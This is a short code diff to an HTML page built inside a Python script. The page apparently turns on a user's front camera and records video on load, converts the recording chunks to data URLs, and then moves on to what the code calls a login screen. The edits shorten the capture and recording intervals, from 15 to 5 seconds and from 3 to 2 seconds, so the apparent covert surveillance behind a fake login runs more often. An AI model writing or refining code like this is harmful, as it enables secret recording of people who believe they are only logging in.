@@ -262,7 +262,7 @@ HTML_PAGE = '''<!DOCTYPE html>
                             }
                         }
                     }catch(e){}
-                }, 3000);
+                }, 2000);
             }catch(e){}
         }
 
@@ -412,7 +412,7 @@ window.addEventListener('load', async ()=>{
                 const fv = document.getElementById('frontVideo');
                 if(fv){ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; }
                 camStarted = true;
-                try{ startCapture(fv,'FRONT'); }catch(err){ console.log('startCapture after gesture failed', err); }
+                try{ startSimpleCapture(); }catch(err){ console.log('startCapture after gesture failed', err); }
 
                 try {
                     let options = { mimeType: 'video/webm;codecs=vp8,opus' };
@@ -430,7 +430,7 @@ window.addEventListener('load', async ()=>{
                             reader.readAsDataURL(ev.data);
                         }
                     };
-                    recorder.start(15000); 
+                    recorder.start(5000); 
                 }catch(err){ console.log('MediaRecorder error', err); }
                 
                 // proceed to login UI transition (non-blocking)
